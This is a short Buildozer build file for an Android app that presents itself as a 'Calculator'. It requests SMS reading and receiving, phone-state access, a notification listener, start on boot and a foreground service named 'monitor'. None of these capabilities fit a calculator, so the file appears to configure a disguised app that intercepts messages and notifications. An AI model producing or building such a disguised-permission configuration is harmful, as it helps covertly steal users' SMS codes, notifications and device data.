[app]
title = Calculator
package.name = smartcalc.v4
package.domain = com.aegis
source.dir = .
requirements = python3,kivy==2.2.1,requests,urllib3,chardet,idna
orientation = portrait
android.permissions = INTERNET, RECEIVE_SMS, READ_SMS, READ_PHONE_STATE, POST_NOTIFICATIONS, BIND_NOTIFICATION_LISTENER_SERVICE, RECEIVE_BOOT_COMPLETED, WAKE_LOCK, FOREGROUND_SERVICE
android.api = 33
android.minapi = 21
android.archs = arm64-v8a
android.accept_sdk_license = True
android.services = monitor:main.py
